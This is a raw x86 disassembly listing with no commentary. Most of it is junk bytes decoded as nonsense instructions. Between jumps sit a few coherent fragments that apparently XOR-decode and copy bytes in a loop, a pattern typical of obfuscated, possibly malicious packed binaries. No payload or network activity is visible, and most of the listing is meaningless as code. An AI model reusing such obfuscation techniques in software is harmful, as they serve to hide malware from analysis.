  406ace:	fist   WORD PTR [edx+0x6b]
  406ad1:	adc    DWORD PTR [eax],edi
  406ad3:	xor    BYTE PTR [ebx+0x63],cl
  406ad6:	stos   DWORD PTR es:[edi],eax
  406ad7:	cmp    ebx,esi
  406ad9:	cmp    DWORD PTR ds:0xf02ff4f3,0xffffffd3
  406ae0:	js     0x406aae
  406ae2:	sbb    edi,ebp
  406ae4:	ficom  WORD PTR [ebp-0x798f0fee]
  406aea:	push   ecx
  406aeb:	and    eax,0x61e3e6cd
  406af0:	cmp    al,0x3c
  406af2:	out    dx,al
  406af3:	retf   
  406af4:	out    dx,eax
  406af5:	loopne 0x406b3d
  406af7:	jle    0x406b76
  406af9:	pop    ebx
  406afa:	in     eax,dx
  406afb:	ror    ebx,1
  406afd:	inc    ecx
  406afe:	dec    esi
  406aff:	stos   BYTE PTR es:[edi],al
  406b00:	dec    ebp
  406b01:	leave  
  406b02:	xor    cl,dl
  406b04:	mov    ebp,0x75d29cf5
  406b09:	mov    cl,0xec
  406b0b:	mov    esi,0x56bb953f
  406b10:	adc    ebx,DWORD PTR [ebp+eiz*1+0x2f]
  406b14:	call   0xb974:0xff8c34f8
  406b1b:	inc    esi
  406b1c:	mov    eax,0xc780784d
  406b21:	in     al,0x64
  406b23:	jno    0x406b27
  406b25:	stos   DWORD PTR es:[edi],eax
  406b26:	mov    bh,0x3e
  406b28:	mov    ebp,0x3790d8c0
  406b2d:	sti    
  406b2e:	jo     0x406ad6
  406b30:	out    0x38,al
  406b32:	(bad)  
  406b33:	out    0x56,eax
  406b35:	mov    cl,BYTE PTR [ebx]
  406b37:	add    al,0xc8
  406b39:	out    0x3,al
  406b3b:	sbb    esi,edi
  406b3d:	inc    esp
  406b3e:	inc    edi
  406b3f:	add    ebx,edx
  406b41:	mov    bh,0xf9
  406b43:	add    al,0x15
  406b45:	pop    eax
  406b46:	or     eax,DWORD PTR [edi]
  406b48:	loop   0x406b20
  406b4a:	lods   al,BYTE PTR ds:[esi]
  406b4b:	sub    esi,edi
  406b4d:	add    edx,ecx
  406b4f:	jmp    0x406fb2
  406b54:	mov    edx,DWORD PTR [ebp-0x18]
  406b57:	xor    edx,eax
  406b59:	add    edx,DWORD PTR [ebp-0x14]
  406b5c:	mov    edi,DWORD PTR [ebp-0x1c]
  406b5f:	mov    dl,BYTE PTR [edx+edi*1+0x32729f]
  406b66:	mov    BYTE PTR [ebp+0xf],dl
  406b69:	mov    edx,DWORD PTR [ebp-0xc]
  406b6c:	xor    edx,eax
  406b6e:	add    edx,DWORD PTR [ebp-0x14]
  406b71:	jmp    0x406cc3
  406b76:	mov    ah,0x9b
  406b78:	scas   al,BYTE PTR es:[edi]
  406b79:	pop    es
  406b7a:	popa   
  406b7b:	cmp    edx,DWORD PTR [ebp+0x59]
  406b7e:	(bad)  
  406b80:	xor    DWORD PTR [eax+0x78951db2],ecx
  406b86:	jecxz  0x406b8e
  406b88:	jle    0x406c08
  406b8a:	and    edi,DWORD PTR [edi+0x7e]
  406b8d:	jle    0x406c00
  406b8f:	push   0x35
  406b91:	push   0xffffffa5
  406b93:	sbb    esi,DWORD PTR [edi]
  406b95:	mov    ebp,0x4f5a97de
  406b9a:	add    eax,0xd4ef01e1
  406b9f:	inc    ecx
  406ba0:	icebp  
  406ba1:	jmp    0x2e8b:0x258d74c7
  406ba8:	push   es
  406ba9:	inc    esi
  406baa:	retf   0xc599
  406bad:	jecxz  0x406b9d
  406baf:	dec    edx
  406bb0:	mov    esi,ebp
  406bb2:	cmp    bh,BYTE PTR [ebx-0x2533bd7f]
  406bb8:	dec    esi
  406bb9:	enter  0xb7c4,0x28
  406bbd:	call   0x3957:0xde83f5eb
  406bc4:	jl     0x406bef
  406bc6:	cmp    dh,ch
  406bc8:	shl    DWORD PTR [esi+0x31b0a2f4],1
  406bce:	pop    ds
  406bcf:	adc    BYTE PTR [edx+0x5c],bl
  406bd2:	sbb    bl,BYTE PTR [eax-0x1ba012aa]
  406bd8:	es retf 0x985d
  406bdc:	mov    ds:0x2168819f,eax
  406be1:	push   es
  406be2:	cli    
  406be3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  406be4:	test   esp,esp
  406be6:	push   ecx
  406be7:	mov    bh,BYTE PTR ds:0x50d658fd
  406bed:	pop    ebp
  406bee:	sub    DWORD PTR [edx],esi
  406bf0:	rol    al,1
  406bf2:	sti    
  406bf3:	xchg   edx,eax
  406bf4:	lock xor ebx,DWORD PTR [esi]
  406bf7:	xor    BYTE PTR [ebp+0x7914ac40],dh
  406bfd:	scas   al,BYTE PTR es:[edi]
  406bfe:	inc    esp
  406bff:	mov    al,0xe9
  406c01:	and    DWORD PTR [eax-0x32],0xe5976b8
  406c08:	test   BYTE PTR [eax-0x13],bh
  406c0b:	push   es
  406c0c:	fcom   DWORD PTR ds:[ebx+0xe]
  406c10:	enter  0x2200,0x4a
  406c14:	pusha  
  406c15:	frndint 
  406c17:	adc    DWORD PTR [edi],edx
  406c19:	cmp    bl,BYTE PTR [edx]
  406c1b:	scas   al,BYTE PTR es:[edi]
  406c1c:	jo     0x406c99
  406c1e:	imul   DWORD PTR ds:0xb6a9df05
  406c24:	or     esi,DWORD PTR [ebp+0x51]
  406c27:	shl    ah,1
  406c29:	xchg   BYTE PTR [edx-0x18],ch
  406c2c:	mov    cl,0xe7
  406c2e:	add    edi,DWORD PTR [edi]
  406c30:	mov    cr2,edi
  406c33:	bswap  ebp
  406c35:	ins    DWORD PTR es:[edi],dx
  406c36:	push   0xffffffc9
  406c38:	lods   al,BYTE PTR ds:[esi]
  406c39:	mov    DWORD PTR [ebp-0x1e],esi
  406c3c:	shr    DWORD PTR [edi-0x1c],cl
  406c3f:	xor    eax,0xaebecb3c
  406c44:	cmp    DWORD PTR [ecx+0x3b],ebx
  406c47:	scas   eax,DWORD PTR es:[edi]
  406c48:	cmp    ah,BYTE PTR [ebx-0x4b]
  406c4b:	fisubr WORD PTR [esi+0xc]
  406c4e:	add    eax,0x7d96c5a2
  406c53:	and    esi,ebp
  406c55:	test   DWORD PTR ds:[eax-0x63f8b758],esi
  406c5c:	xor    edx,ecx
  406c5e:	je     0x406c62
  406c60:	xchg   DWORD PTR [edi+0x1a],ecx
  406c63:	loope  0x406c4d
  406c65:	add    eax,DWORD PTR [edi+0x22]
  406c68:	jae    0x406cab
  406c6a:	outs   dx,DWORD PTR ds:[esi]
  406c6b:	lahf   
  406c6c:	push   ebx
  406c6d:	lock dec esp
  406c6f:	inc    edx
  406c70:	popf   
  406c71:	pop    edi
  406c72:	pop    ecx
  406c73:	and    cl,bh
  406c75:	bts    DWORD PTR [bx],esp
  406c79:	sub    ecx,ebp
  406c7b:	mov    ebp,0x6d022f
  406c80:	push   edi
  406c81:	in     al,dx
  406c82:	mov    edx,DWORD PTR [ebx]
  406c84:	and    eax,0x21cde2f9
  406c89:	xor    al,0x64
  406c8b:	fmul   DWORD PTR [ecx]
  406c8d:	pusha  
  406c8e:	test   bh,dh
  406c90:	fiadd  DWORD PTR [eax+0x50]
  406c93:	cdq    
  406c94:	push   esp
  406c95:	xor    edi,DWORD PTR [esi+0x782b39d8]
  406c9b:	dec    edx
  406c9c:	sbb    BYTE PTR [ebx+0x38],0x34
  406ca0:	jp     0x406c6d
  406ca2:	mov    edi,0x3d4bcd20
  406ca7:	ss add al,0x5
  406caa:	mov    ds:0xa275a0b0,al
  406caf:	or     edx,DWORD PTR [ebx+0x1d]
  406cb2:	imul   ebp,DWORD PTR [edi+0x13],0xf7c44453
  406cb9:	push   0x40e91037
  406cbe:	call   0x7d8b:0x22624830
  406cc5:	in     al,0x8a
  406cc7:	xchg   esp,eax
  406cc8:	cmp    bl,BYTE PTR [edi-0x77ffcd8e]
  406cce:	push   ebp
  406ccf:	or     ecx,DWORD PTR [edx+0x7d8b0f55]
  406cd5:	hlt    
  406cd6:	xor    edi,eax
  406cd8:	add    edi,DWORD PTR [ebp-0x14]
  406cdb:	mov    ebx,DWORD PTR [ebp-0x1c]
  406cde:	jmp    0x406e30
  406ce3:	stos   DWORD PTR es:[edi],eax
  406ce4:	out    dx,eax
  406ce5:	pop    edx
  406ce6:	sbb    al,0x5a
  406ce8:	test   eax,0x2e197979
  406ced:	leave  
  406cee:	ss dec ecx
  406cf0:	sbb    edi,DWORD PTR cs:[esp+edx*4+0x237e7e07]
  406cf8:	jg     0x406d78
  406cfa:	jle    0x406cbb
  406cfc:	jp     0x406d65
  406cfe:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  406cff:	cwde   
  406d00:	sub    esp,DWORD PTR [ecx]
  406d02:	jle    0x406d00
  406d04:	aam    0x12
  406d06:	cmp    DWORD PTR [ecx],ebx
  406d08:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  406d09:	and    eax,0x3698aead
  406d0e:	jl     0x406c97
  406d10:	inc    edx
  406d11:	call   eax
  406d13:	push   0x334aa90
  406d18:	pop    ecx
  406d19:	icebp  
  406d1a:	ins    DWORD PTR es:[edi],dx
  406d1b:	loop   0x406d43
  406d1d:	adc    BYTE PTR [ebx],bl
  406d1f:	mov    ds:0x5565dcfb,eax
  406d24:	pop    esi
  406d25:	pop    ebx
  406d26:	mov    esi,ebx
  406d28:	loopne 0x406d0e
  406d2a:	push   ecx
  406d2b:	push   cs
  406d2c:	jg     0x406d7d
  406d2e:	jns    0x406cc8
  406d30:	mov    dh,0xc0
  406d32:	or     dh,BYTE PTR [edi+0x34]
  406d35:	fs jo  0x406d72
  406d38:	push   es
  406d39:	or     edi,DWORD PTR [eax-0x3b363ec1]
  406d3f:	setg   BYTE PTR [edi+0x6f]
  406d43:	adc    BYTE PTR [ebp+0x2bc0fc4e],ch
  406d49:	adc    BYTE PTR [ebx],bh
  406d4b:	(bad)  
  406d4c:	loope  0x406cf1
  406d4e:	jns    0x406d95
  406d50:	imul   esp,DWORD PTR es:[ebp+0x368a9e26],0x6d
  406d58:	mov    bl,0x1f
  406d5a:	push   ss
  406d5b:	sub    BYTE PTR [edx],bl
  406d5d:	push   0x68d9da08
  406d62:	fdivr  st(4),st
  406d64:	cmp    BYTE PTR [edi+ebp*4],0xca
  406d68:	dec    esp
  406d69:	xor    BYTE PTR [eax+ebx*1],cl
  406d6c:	leave  
  406d6d:	or     ebp,edi
  406d6f:	mov    edi,ecx
  406d71:	je     0x406d4c
  406d73:	ins    BYTE PTR es:[edi],dx
  406d74:	inc    edx
  406d75:	xchg   edx,eax
  406d76:	xor    eax,ebp
  406d78:	jne    0x406d0f
  406d7a:	jno    0x406d7c
  406d7c:	sar    cl,cl
  406d7e:	stos   BYTE PTR es:[edi],al
  406d7f:	dec    esi
  406d80:	jg     0x406d8a
  406d82:	pop    ecx
  406d83:	das    
  406d84:	adc    esi,DWORD PTR [edx]
  406d86:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  406d87:	outs   dx,DWORD PTR ds:[esi]
  406d88:	pushf  
  406d89:	xchg   ebx,eax
  406d8a:	call   0xc9a53f9d
  406d8f:	add    bl,bl
  406d91:	mov    ecx,0x42e78e62
  406d96:	xor    al,bh
  406d98:	dec    edx
  406d99:	jle    0x406d46
  406d9b:	retf   0x81b6
  406d9e:	xor    edi,DWORD PTR [edx+0x671878e5]
  406da4:	scas   al,BYTE PTR es:[edi]
  406da5:	inc    ecx
  406da6:	sub    al,0xbe
  406da8:	retf   
  406da9:	or     ch,BYTE PTR [edx]
  406dab:	cli    
  406dac:	xchg   esi,eax
  406dad:	lods   eax,DWORD PTR ds:[esi]
  406dae:	sub    eax,DWORD PTR [ebp*8-0x1b8a46ae]
  406db5:	jmp    0x1bda:0x2be17ffe
  406dbc:	pop    ds
  406dbd:	sub    BYTE PTR [edi-0x5e],dl
  406dc0:	imul   ecx,DWORD PTR [edi+0x5e],0x64213ab6
  406dc7:	pop    ebx
  406dc8:	es cmp al,0x5a
  406dcb:	adc    al,0x6d
  406dcd:	inc    esp
  406dce:	push   ebp
  406dcf:	xchg   DWORD PTR [ebx-0x4c5ce5af],esp
  406dd5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  406dd6:	sahf   
  406dd7:	inc    ebx
  406dd8:	fs add dl,dl
  406ddb:	repz in al,0x3b
  406dde:	sbb    DWORD PTR [ebp+0x487f5185],edx
  406de4:	pop    ebx
  406de5:	or     BYTE PTR [ecx-0x9847e24],bh
  406deb:	push   eax
  406dec:	cmp    BYTE PTR [edi+esi*1],al
  406def:	mov    dh,0x53
  406df1:	shl    BYTE PTR [esi+0x43],cl
  406df4:	mov    bl,0x86
  406df6:	push   0x74c64051
  406dfb:	mov    ebx,0x1dda7650
  406e00:	int3   
  406e01:	pop    ss
  406e02:	icebp  
  406e03:	and    al,bl
  406e05:	fst    st(4)
  406e07:	jae    0x406d8d
  406e09:	xchg   esp,eax
  406e0a:	ror    DWORD PTR [ebx+0x448c4c2c],0x43
  406e11:	push   cs
  406e12:	mov    al,ds:0xaf71cf56
  406e17:	dec    edx
  406e18:	out    dx,al
  406e19:	inc    esp
  406e1a:	pop    eax
  406e1b:	aam    0x2a
  406e1d:	mov    ecx,0x34f05932
  406e22:	add    BYTE PTR [edi+0x677e3e1a],ch
  406e28:	inc    edi
  406e29:	xchg   edx,eax
  406e2a:	jne    0x406e4c
  406e2c:	outs   dx,BYTE PTR ds:[esi]
  406e2d:	pop    edx
  406e2e:	lock jns 0x406db9
  406e31:	xchg   esp,eax
  406e32:	pop    ds
  406e33:	lahf   
  406e34:	jb     0x406e68
  406e36:	add    cl,ch
  406e38:	dec    ebp
  406e39:	add    DWORD PTR [eax],eax
  406e3b:	add    BYTE PTR [ecx+0x24],bh
  406e3e:	mov    dh,0xd8
  406e40:	dec    ebx
  406e41:	js     0x406ebc
  406e43:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  406e44:	mov    BYTE PTR [esi-0x4],bl
  406e47:	lods   al,BYTE PTR ds:[esi]
  406e48:	je     0x406e65
  406e4a:	push   esp
  406e4b:	cmp    DWORD PTR [ecx+0x4],ebx
  406e4e:	jle    0x406ece
  406e50:	and    edi,DWORD PTR [edi+0x7e]
  406e53:	jle    0x406e37
  406e55:	js     0x406ec2
  406e57:	jns    0x406e45
  406e59:	mov    al,0xe
  406e5b:	adc    DWORD PTR [esi],0xb1c07083
  406e61:	and    al,0x0
  406e63:	es mov edi,0x7837329e
  406e69:	scas   eax,DWORD PTR es:[edi]
  406e6a:	cmp    eax,DWORD PTR [eax+0x500a56f2]
  406e70:	jne    0x406e48
  406e72:	push   0x4fc8af5f
  406e77:	lea    eax,[eax]
  406e79:	iret   
  406e7a:	push   ebp
  406e7b:	sbb    edx,esi
  406e7d:	mov    al,ds:0x4ea1ae7b
  406e82:	femms  
  406e84:	daa    
  406e85:	push   edi
  406e86:	xor    eax,0x62fc5c48
  406e8b:	and    al,0xae
  406e8d:	(bad)  
  406e8e:	aad    0xf4
  406e90:	fmul   DWORD PTR [edx]
  406e92:	call   0x5744c689
  406e97:	xor    eax,0x3cb4bf95
  406e9c:	pop    ds
  406e9d:	adc    cl,0xbb
  406ea0:	pop    edi
  406ea1:	(bad)  
  406ea3:	stos   BYTE PTR es:[edi],al
  406ea4:	mov    DWORD PTR [ecx-0x76],ebp
  406ea7:	sub    al,al
  406ea9:	scas   al,BYTE PTR es:[edi]
  406eaa:	(bad)  
  406eab:	lods   eax,DWORD PTR ds:[esi]
  406eac:	ror    BYTE PTR ds:0xa158983f,cl
  406eb2:	arpl   dx,ax
  406eb4:	test   BYTE PTR [ebp+0x5b6094eb],0x68
  406ebb:	and    bl,0xc9
  406ebe:	sub    dh,al
  406ec0:	push   eax
  406ec1:	cmp    dl,bh
  406ec3:	adc    ah,BYTE PTR [edi+eiz*2+0x4c]
  406ec7:	cmp    al,0x77
  406ec9:	pop    es
  406eca:	push   esi
  406ecb:	leave  
  406ecc:	cli    
  406ecd:	push   edi
  406ece:	or     ecx,esp
  406ed0:	push   eax
  406ed1:	rcl    ebp,cl
  406ed3:	mov    al,ds:0x127aae02
  406ed8:	hlt    
  406ed9:	cli    
  406eda:	icebp  
  406edb:	jbe    0x406e93
  406edd:	div    edx
  406edf:	imul   ecx,DWORD PTR [edi],0xffffffc0
  406ee2:	jp     0x406f44
  406ee4:	adc    BYTE PTR ds:0x8f4e626a,ah
  406eea:	icebp  
  406eeb:	lods   eax,DWORD PTR ds:[esi]
  406eec:	push   edi
  406eed:	out    0x83,al
  406eef:	mov    dl,0xa4
  406ef1:	jbe    0x406f20
  406ef3:	sbb    ah,BYTE PTR [esi+0x287756e3]
  406ef9:	push   cs
  406efa:	ds fs pop ebx
  406efd:	add    DWORD PTR [eax+ecx*2-0x28581d04],edi
  406f04:	jg     0x406f51
  406f06:	mov    esp,0x5f6c397d
  406f0b:	shr    DWORD PTR [ecx],1
  406f0d:	lea    eax,ds:0x82582302
  406f13:	jge    0x406ea5
  406f15:	pop    ebp
  406f16:	outs   dx,DWORD PTR ds:[esi]
  406f17:	out    0x2,al
  406f19:	mov    bl,BYTE PTR [edx+ebp*8]
  406f1c:	das    
  406f1d:	xchg   edx,eax
  406f1e:	jecxz  0x406f9b
  406f20:	sub    al,0x59
  406f22:	fs xchg ebx,eax
  406f24:	jmp    0x406ecf
  406f26:	iret   
  406f27:	nop
  406f28:	pop    es
  406f29:	fidiv  WORD PTR [ecx+0x72]
  406f2c:	inc    esp
  406f2d:	jmp    DWORD PTR [ebx-0x67]
  406f30:	cmp    BYTE PTR [ecx-0x6a6f26c7],al
  406f36:	xchg   esp,eax
  406f37:	shr    DWORD PTR [esi],1
  406f39:	xor    BYTE PTR [ebx-0x7f184ec3],dh
  406f3f:	sub    ebx,DWORD PTR [ebp+0x2c]
  406f42:	push   eax
  406f43:	add    al,0x45
  406f45:	popf   
  406f46:	sub    ch,ah
  406f48:	(bad)  
  406f49:	push   0xffffffc1
  406f4b:	mov    ch,0x74
  406f4d:	popf   
  406f4e:	jle    0x406ef2
  406f50:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  406f51:	test   eax,0xb59440d1
  406f56:	addr16 repz jne 0x406f51
  406f5a:	inc    esp
  406f5b:	mov    ecx,0xd07afec7
  406f60:	je     0x406f43
  406f62:	(bad)  
  406f63:	xor    bh,BYTE PTR es:[eax+0x542b7d9c]
  406f6a:	mov    BYTE PTR [edx-0x77],bl
  406f6d:	or     ebp,DWORD PTR [esi]
  406f6f:	es cmp eax,esi
  406f72:	sub    eax,0x584b51f6
  406f77:	ins    DWORD PTR es:[edi],dx
  406f78:	push   es
  406f79:	xor    BYTE PTR [eax-0x5305ae35],ah
  406f7f:	inc    esi
  406f80:	pop    edx
  406f81:	shl    DWORD PTR [ebx-0x1e],1
  406f84:	mov    edx,0xfe2b4a6d
  406f89:	mov    dl,BYTE PTR [ebp+0xb]
  406f8c:	mov    edi,DWORD PTR [ebp-0x18]
  406f8f:	xor    edi,eax
  406f91:	add    edi,DWORD PTR [ebp-0x14]
  406f94:	mov    ebx,DWORD PTR [ebp-0x1c]
  406f97:	mov    BYTE PTR [edi+ebx*1+0x32729f],dl
  406f9e:	mov    edx,DWORD PTR [ebp-0x44]
  406fa1:	mov    edi,DWORD PTR [ebp-0xc]
  406fa4:	xor    edx,eax
  406fa6:	xor    edi,eax
  406fa8:	add    edx,ecx
  406faa:	add    edi,ecx
  406fac:	imul   edx,edi
  406faf:	add    edx,DWORD PTR [ebp-0x14]
  406fb2:	mov    DWORD PTR [ebp-0x14],edx
  406fb5:	mov    edx,DWORD PTR [ebp-0xc]
  406fb8:	mov    edi,DWORD PTR [ebp-0x24]
  406fbb:	xor    edx,eax
  406fbd:	add    edx,ecx
  406fbf:	imul   edx,edi
  406fc2:	mov    edi,DWORD PTR [ebp-0xc]
  406fc5:	xor    edi,eax
  406fc7:	sub    edx,edi
  406fc9:	mov    edi,DWORD PTR [ebp-0xc]
  406fcc:	mov    ebx,DWORD PTR [ebp-0x14]
  406fcf:	xor    edi,eax
  406fd1:	add    edi,ecx
  406fd3:	imul   edi,ebx
  406fd6:	mov    ebx,DWORD PTR [ebp-0x18]
  406fd9:	xor    ebx,eax
  406fdb:	sub    edx,ecx
  406fdd:	lea    edi,[edi+ebx*1+0x32729f]
  406fe4:	cmp    edi,edx
  406fe6:	jbe    0x406b54
  406fec:	mov    edx,DWORD PTR [ebp-0xc]
  406fef:	mov    edi,DWORD PTR [ebp-0x24]
  406ff2:	xor    edx,eax
  406ff4:	add    edx,ecx
  406ff6:	imul   edx,edi
  406ff9:	mov    edi,DWORD PTR [ebp-0x18]
  406ffc:	xor    edi,eax
  406ffe:	jmp    0x407150
  407003:	hlt    
  407004:	jae    0x40702b
  407006:	pop    ds
  407007:	mov    ecx,0xa4a98439
  40700c:	pushf  
  40700d:	sbb    al,0x11
  40700f:	mov    BYTE PTR [eax-0x26],al
  407012:	mov    ds:0x7e7e1a02,eax
  407017:	and    edi,DWORD PTR [edi+0x7e]
  40701a:	jle    0x40701c
  40701c:	ficomp WORD PTR [edx+ebp*4]
  40701f:	test   DWORD PTR [ebp+0x18],ebx
  407022:	jmp    0x8b0fa201
  407027:	mov    cl,0x7d
  407029:	iret   
  40702a:	ret    0x7640
  40702d:	in     al,0x16
  40702f:	xlat   BYTE PTR ds:[ebx]
  407030:	ins    BYTE PTR es:[edi],dx
  407031:	retfw  0xd02
  407035:	mov    ds:0x2f0c0e80,eax
  40703a:	mov    eax,ds:0x7298db54
  40703f:	in     al,0xdc
  407041:	fsubr  st(2),st
  407043:	(bad)  
  407044:	enter  0x705a,0x64
  407048:	(bad)  
  40704a:	mov    ah,0xa4
  40704c:	sahf   
  40704d:	push   es
  40704e:	sub    bh,BYTE PTR [ecx+0x6c]
  407051:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  407052:	jo     0x407027
  407054:	jle    0x407077
  407056:	out    0x4b,eax
  407058:	mov    bl,0x81
  40705a:	dec    ecx
  40705b:	std    
  40705c:	imul   eax,DWORD PTR [ecx+0x6],0x23
  407060:	imul   ebx,DWORD PTR [ecx+0x7e],0xa425b901
  407067:	mov    cl,0x48
  407069:	stos   DWORD PTR es:[edi],eax
  40706a:	addr16 mov esp,0xa02b5a83
  407070:	push   es
  407071:	xchg   ebp,eax
  407072:	xchg   ecx,eax
  407073:	dec    esi
  407074:	xchg   ebx,eax
  407075:	jle    0x4070d0
  407077:	cdq    
  407078:	js     0x407016
  40707a:	ins    BYTE PTR es:[edi],dx
  40707b:	add    ah,cl
  40707d:	cwde   
  40707e:	adc    DWORD PTR [ebp-0x52e270a6],ecx
  407084:	push   edx
  407085:	sub    edx,eax
  407087:	jb     0x40700f
  407089:	aaa    
  40708a:	lahf   
  40708b:	nop
  40708c:	icebp  
  40708d:	xchg   esi,eax
  40708e:	out    dx,eax
  40708f:	enter  0xe45b,0x84
  407093:	jg     0x40704f
  407095:	lods   eax,DWORD PTR ds:[esi]
  407096:	adc    BYTE PTR [ebx+0x1d],al
  407099:	repz into 
  40709b:	sbb    al,0xdd
  40709d:	push   edi
  40709e:	test   edi,ebx
  4070a0:	mov    ch,0x2f
  4070a2:	gs mov eax,0xf037ca55
  4070a8:	mov    edi,0x6fc4b73
  4070ad:	sbb    dl,BYTE PTR [esi-0x42]
  4070b0:	pop    ebx
  4070b1:	pop    esi
  4070b2:	jmp    0x4070d8
  4070b4:	int3   
  4070b5:	ficom  WORD PTR [ecx-0x24eb8c74]
  4070bb:	stos   DWORD PTR es:[edi],eax
  4070bc:	cs sub al,0x61
  4070bf:	(bad)  
  4070c0:	push   eax
  4070c1:	jle    0x4070bd
  4070c3:	xchg   DWORD PTR [ebx],ebp
  4070c5:	ins    BYTE PTR es:[edi],dx
  4070c6:	enter  0x8e23,0x11
  4070ca:	idiv   edx
  4070cc:	lea    esi,[ecx]
  4070ce:	out    0x30,al
  4070d0:	xchg   esp,eax
  4070d1:	adc    eax,DWORD PTR [edi+0x4d]
  4070d4:	sbb    eax,0x39505189
  4070d9:	jns    0x4070f8
  4070db:	and    BYTE PTR ds:0x1e0ee2f2,ch
  4070e1:	push   edi
  4070e2:	or     DWORD PTR [edi-0x3b316e07],0xe998ecee
  4070ec:	cdq    
  4070ed:	ja     0x4070ef
  4070ef:	sbb    eax,0x9f82564c
  4070f4:	adc    al,0x84
  4070f6:	jg     0x4070e7
  4070f8:	or     bl,bh
  4070fa:	pop    ecx
  4070fb:	sbb    al,0x85
  4070fd:	xchg   dh,cl
  4070ff:	ins    DWORD PTR es:[edi],dx
  407100:	cmp    al,0xfc
  407102:	leave  
  407103:	dec    eax
  407104:	shl    BYTE PTR [edx-0x455eb823],cl
  40710a:	ror    BYTE PTR [edx+0x5292cf00],cl
  407110:	fiadd  WORD PTR [edi]
  407112:	xlat   BYTE PTR ds:[ebx]
  407113:	mov    al,ds:0x6a96a42e
  407118:	and    al,0x8a
  40711a:	xor    eax,0xcf90b678
  40711f:	mov    al,BYTE PTR [edi+0x501d51b6]
  407125:	shl    DWORD PTR [esi+0x431a0de2],0x1a
  40712c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40712d:	std    
  40712e:	out    dx,al
  40712f:	and    esi,DWORD PTR [eax+0x6e98287f]
  407135:	pop    ecx
  407136:	add    DWORD PTR [edx-0x27],edi
  407139:	out    0xba,eax
  40713b:	jne    0x407146
  40713d:	adc    DWORD PTR [esi-0x55b795f5],ebp
  407143:	adc    eax,0xb5973d8a
  407148:	xchg   DWORD PTR [edx],edx
  40714a:	shl    eax,0x39
  40714d:	ds (bad) 
  407150:	add    edx,edi
  407152:	mov    edi,DWORD PTR [ebp-0x8]
  407155:	lea    edx,[edx+edi*1+0x32729f]
  40715c:	mov    DWORD PTR [ebp-0x8],edx
  40715f:	mov    edx,DWORD PTR [ebp-0x20]
  407162:	xor    edx,eax
  407164:	mov    edi,0xffcd8d61
  407169:	sub    edi,edx
  40716b:	add    edi,DWORD PTR [ebp-0x10]
  40716e:	jmp    0x4072c0
  407173:	sub    ebp,DWORD PTR [edi+0x59798f79]
  407179:	jmp    0x9398b939
  40717e:	sub    al,0xe7
  407180:	adc    esi,DWORD PTR [edx]
  407182:	inc    esi
  407183:	aaa    
  407184:	sbb    edi,DWORD PTR [esi+0x7e]
  407187:	and    edi,DWORD PTR [edi+0x7e]
  40718a:	jle    0x407134
  40718c:	test   BYTE PTR [ebp-0x78fa2abf],dh
  407192:	retf   0x4607
  407195:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  407196:	cmp    DWORD PTR [ecx+0x6ee7389e],edx
  40719c:	jp     0x4071b9
  40719e:	shl    DWORD PTR [edi*2-0xeea77c1],1
  4071a5:	pop    ecx
  4071a6:	ficomp WORD PTR [ebx-0x46fdced5]
  4071ac:	and    DWORD PTR [eax+0x2],esp
  4071af:	pavgw  mm2,QWORD PTR ds:0xa1a41d59
  4071b6:	mov    ebx,0x18aec313
  4071bb:	ficomp WORD PTR [ecx+edi*1]
  4071be:	fwait
  4071bf:	enter  0x80fc,0x5
  4071c3:	or     ebx,esp
  4071c5:	push   ds
  4071c6:	js     0x407203
  4071c8:	add    bl,BYTE PTR [ebx+eax*2]
  4071cb:	shl    DWORD PTR [ecx],1
  4071cd:	sub    eax,DWORD PTR [edi+0x63b8d912]
  4071d3:	rcr    DWORD PTR [edx-0x68a89da1],0x86
  4071da:	sbb    al,dl
  4071dc:	nop
  4071dd:	int    0x90
  4071df:	pop    esi
  4071e0:	xchg   esp,eax
  4071e1:	inc    esp
  4071e2:	xchg   edx,edi
  4071e4:	stos   DWORD PTR es:[edi],eax
  4071e5:	pop    edx
  4071e6:	test   eax,0x70eb17a1
  4071eb:	inc    ebp
  4071ec:	(bad)  
  4071ed:	repnz cmp BYTE PTR [ebp+0x76],bl
  4071f1:	sbb    al,0x20
  4071f3:	pop    eax
  4071f4:	xchg   esi,eax
  4071f5:	mov    eax,ds:0x517e1f3d
  4071fa:	mov    cl,0xcf
  4071fc:	cmp    al,0xe3
  4071fe:	add    al,0xdd
  407200:	pop    ds
  407201:	dec    eax
  407202:	pop    ebp
  407203:	nop
  407204:	pop    edx
  407205:	jae    0x4071c8
  407207:	sub    eax,0x39a73e1
  40720c:	aad    0x86
  40720e:	(bad)  
  40720f:	cli    
  407210:	idiv   ebp
  407212:	cmp    edx,DWORD PTR [esp+edx*4+0x6bb1ada4]
  407219:	add    eax,0xe934676e
  40721e:	outs   dx,BYTE PTR ds:[esi]
  40721f:	pop    ss
  407220:	mov    al,0x0
  407222:	xor    BYTE PTR [esi-0xe],dh
  407225:	jl     0x4072a2
  407227:	inc    eax
  407228:	mov    ds:0x8de98aa6,eax
  40722d:	mov    ah,0xca
  40722f:	mov    edi,0x7f296ad8
  407234:	mov    ecx,0x2a841d17
  407239:	push   cs
  40723a:	mov    ?,WORD PTR [eax-0x23f34770]
  407240:	retf   
  407241:	call   0x297c:0xbdfddaa1
  407248:	push   eax
  407249:	mov    ch,0x1b
  40724b:	test   al,0x54
  40724e:	mov    DWORD PTR [edi+0x7c],eax
  407251:	retf   0xc8f
  407254:	jle    0x40722c
  407256:	xor    cl,BYTE PTR [esi]
  407258:	repnz lea eax,[eax-0x65]
  40725c:	cmp    dl,dh
  40725e:	xchg   ecx,eax
  40725f:	inc    eax
  407260:	call   0xe01bc756
  407265:	xlat   BYTE PTR ds:[ebx]
  407266:	test   eax,0x4853a3a7
  40726b:	add    eax,DWORD PTR [eax+0x2c]
  40726e:	adc    BYTE PTR [edx+0x5bec4c5f],bl
  407274:	cmp    al,ah
  407276:	mov    bh,0x2b
  407278:	mov    bl,0x66
  40727a:	test   eax,0x87da39d
  40727f:	or     al,BYTE PTR [ebx]
  407281:	mov    ds:0x97c16fad,al
